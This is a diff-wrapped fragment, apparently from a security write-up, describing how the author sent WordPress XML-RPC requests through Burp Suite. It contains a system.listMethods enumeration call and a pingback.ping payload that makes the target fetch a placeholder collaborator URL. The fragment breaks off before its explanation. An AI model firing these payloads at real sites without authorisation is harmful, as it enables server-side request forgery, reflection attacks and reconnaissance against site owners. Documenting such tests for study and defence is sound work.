@@ -1,0 +1,20 @@
+<methodCall>
+  <methodName>system.listMethods</methodName>
+  <params></params>
+</methodCall>
+
+
+Using Burp Suite, I crafted a POST request to xmlrpc.php with a custom XML payload that looked something like this:
+
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param>
+      <value><string>http://your-collaborator-url.com</string></value>
+    </param>
+    <param>
+      <value><string>https://redacted.com/xmlrpc.php</string></value>
+    </param>
+  </params>
+</methodCall>
+Here’s what this does:
